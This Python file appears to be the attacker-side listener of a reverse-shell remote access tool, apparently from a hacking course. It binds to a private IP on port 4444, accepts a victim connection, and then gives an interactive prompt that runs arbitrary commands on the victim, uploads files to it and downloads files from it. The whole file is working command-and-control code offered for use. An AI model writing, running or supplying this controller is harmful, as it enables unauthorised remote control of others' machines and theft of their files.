import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((ip, port))
        self.listener.listen(0)
        print("Waiting for Connections")
        self.connection, address = self.listener.accept()
        print("Connection Established Successfully " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        return self.reliable_receive().get("result")

    @staticmethod
    def write_file(path, content):
        decoded_content = base64.b64decode(content)
        with open(path, "wb") as file:
            file.write(decoded_content)
        return "Downloaded"

    @staticmethod
    def read_file(path):
        with open(path, "rb") as file:
            file_content = file.read()
        return base64.b64encode(file_content).decode()

    def run(self):
        while True:
            command = input(">> ")
            command_parts = command.split(" ")

            try:
                if command_parts[0] == "upload":
                    file_content = self.read_file(command_parts[1])
                    self.reliable_send({"command": "upload", "path": command_parts[1], "content": file_content})
                    result = self.reliable_receive().get("result")
                elif command_parts[0] == "download":
                    self.reliable_send({"command": "download", "path": command_parts[1]})
                    file_content = self.reliable_receive().get("result")
                    result = self.write_file(command_parts[1], file_content)
                elif command_parts[0] == "cd":
                    self.reliable_send({"command": "cd", "path": command_parts[1]})
                    result = self.reliable_receive().get("result")
                elif command_parts[0] == "exit":
                    self.reliable_send({"command": "exit"})
                    print("Connection closed")
                    break
                else:
                    result = self.execute_remotely({"command": " ".join(command_parts)})
            except Exception as e:
                result = str(e)

            print(result)

        self.connection.close()
        self.listener.close()

if __name__ == "__main__":
    my_listener = Listener("192.168.18.129", 4444)
    my_listener.run()
